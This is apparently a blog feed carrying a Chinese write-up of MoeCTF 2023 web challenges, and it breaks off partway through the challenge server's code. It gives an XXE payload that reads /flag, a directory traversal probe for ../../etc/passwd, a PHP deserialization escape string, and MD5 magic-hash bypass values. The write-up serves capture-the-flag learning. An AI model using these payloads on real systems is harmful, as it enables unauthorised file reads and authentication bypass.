    <link href="/2023/09/28/CNSS_Summer_WP/"/>
    <url>/2023/09/28/CNSS_Summer_WP/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6911150e5879880766f87998d794d7a6fd7ea0f99c295e842fa034e732f762d3"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023MoeCTF</title>
    <link href="/2023/09/28/MoectfWP/"/>
    <url>/2023/09/28/MoectfWP/</url>
    
    <content type="html"><![CDATA[<h1 id="Moectf-2023-WP"><a href="#Moectf-2023-WP" class="headerlink" title="Moectf_2023_WP"></a>Moectf_2023_WP</h1><h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><p>F12查看源码，发现本题是XXE漏洞</p><p>我们要获取的是flag</p><p>于是利用xml外部实体注入，利用file协议读取文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>url编码后，可以解决</p><p>对flag那个界面打包后，</p><p>将 xml_content&#x3D;后面的内容改为编码后的内容，发送请求，即可获得flag</p><img src="/2023/09/28/MoectfWP/image-20230819231808163.png" class title="image-20230819231808163"><p>XXE总结:<a href="https://blog.csdn.net/weixin_44420143/article/details/118721145?ops_request_misc=%7B%22request_id%22:%22169244466516777224445916%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169244466516777224445916&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-118721145-null-null.142%5Ev93%5EchatsearchT3_2&utm_term=XXE&spm=1018.2226.3001.4187">XXE知识总结，有这篇就够了！_是叶十三的博客-CSDN博客</a></p><h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p>打开题目</p><img src="/2023/09/28/MoectfWP/image-20230820223724882.png" class title="image-20230820223724882"><p>发现有个Hanxin.exe.php(一点教训:一开始以为这个文件是隐藏的，所以没查看，以后做题应该都试一下能不能查看)</p><p>查看之后，发现这个是获得flag的关键</p><img src="/2023/09/28/MoectfWP/image-20230820224246208.png" class title="image-20230820224246208"><p>除此之外，这个文件里面还做了一件事，字符串替换，于是可以考虑反序列化字符逃逸</p><p>我们传chant的值，然后通过这个修改Spear_Owner的值，需要用到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这个字符串的长度是35，所以在字符串发生替换的时候，要增加35个长度以此来逃逸后面的<code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p><p>利用已知的字符串替换，构造出有效的payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?/chant=di_jiu_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="hljs-string">&quot;;s:11:&quot;</span>Spear_Owne<span class="hljs-string">r&quot;;s:6:&quot;</span>MaoLei<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>如果不利用字符串替换时字符串长度的增减变化，在反序列化时会发生错误（s的长度与内容不一致）导致无法修改Spear_Owner的值</p><p>总结:反序列化字符串逃逸利用的是<strong>字符串的替换(长度的变化)，</strong>的闭合从何实现反序列化的截断，从而修改对象里面的值</p><h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p>这道题一开始以为是考文件上传，后面发现AntSword连不上，问了e神，说是目录穿越(目录遍历)，于是查了一下。</p><p>一般发现目录遍历的漏洞的探针，也就是测试的时候往往是使用这样的payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.xxxx.com<span class="hljs-regexp">/xxx.php?page=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p>发现上传一张正常的图片后有upload.php,尝试目录穿越,但是并没有回显</p><p>上传图片后有查看二字，点击之后发现有</p><p><code>http://localhost:53462/images.php?name=</code>这样的东西，于是尝试目录穿越</p><p><code>http://localhost:53462/images.php?name=../../../flag</code></p><p>F12查看并没有发现任何东西，于是burp抓包，发到Reapter，发送请求，发现一个文件</p><img src="/2023/09/28/MoectfWP/image-20230821231653530.png" class title="image-20230821231653530"><p>直接打开该文件,发现以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$param1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param1&#x27;</span>];<br>    <span class="hljs-variable">$param2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param1</span> !== <span class="hljs-variable">$param2</span>) &#123;<br>        <br>        <span class="hljs-variable">$md5Param1</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param1</span>);<br>        <span class="hljs-variable">$md5Param2</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$param2</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5Param1</span> == <span class="hljs-variable">$md5Param2</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.O!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o??&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O?&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>发现是MD5绕过问题，有两种，一种是数组绕过，一种是碰撞绕过</p><p>数组绕过:</p><img src="/2023/09/28/MoectfWP/image-20230821232304954.png" class title="image-20230821232304954"><p>碰撞绕过:</p><img src="/2023/09/28/MoectfWP/image-20230821232355927.png" class title="image-20230821232355927">**绕过原理**：PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，<p>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><p>下面是md5加密后0e开头的字符串：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dns">QNKCDZO<br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br>  <br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>  <br>s155964671a<br><span class="hljs-number">0</span>e342768416822451524<span class="hljs-number">974117254469</span><br>  <br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>  <br>s214587387a<br><span class="hljs-number">0</span>e8482404488305379244<span class="hljs-number">65865611904</span><br>  <br>s878926199a<br><span class="hljs-number">0</span>e5459932745177090343<span class="hljs-number">28855841020</span><br>  <br>s1091221200a<br><span class="hljs-number">0</span>e9406242178565615578<span class="hljs-number">16327384675</span><br>  <br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br>  <br>s1502113478a<br><span class="hljs-number">0</span>e8615801632915612474<span class="hljs-number">04381396064</span><br>  <br>s1885207154a<br><span class="hljs-number">0</span>e5093672134182067008<span class="hljs-number">42008763514</span><br><br></code></pre></td></tr></table></figure><p>利用数组绕过，得到flag</p><img src="/2023/09/28/MoectfWP/image-20230821232510261.png" class title="image-20230821232510261">碰撞绕过也行<img src="/2023/09/28/MoectfWP/image-20230821232805483.png" class title="image-20230821232805483"><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-comment"># 用户为admin,password也是admin，二者异或之后为0</span><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())<br>-----------<br><span class="hljs-comment"># [[0] for base64.b64encode in [base64.b64decode]]</span><br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">int</span>.to_bytes(<span class="hljs-number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="hljs-number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="hljs-number">160</span>,<span class="hljs-string">&quot;big&quot;</span>,signed=<span class="hljs-literal">True</span>).decode().translate(&#123;<span class="hljs-built_in">ord</span>(c):<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\x00&quot;</span>&#125;)) <span class="hljs-comment"># what is it?</span><br><span class="hljs-comment">#实际上是加密5次</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode()<br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>: <span class="hljs-comment">#在这个页面post请求</span><br>                <span class="hljs-comment">#json传数据</span><br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span 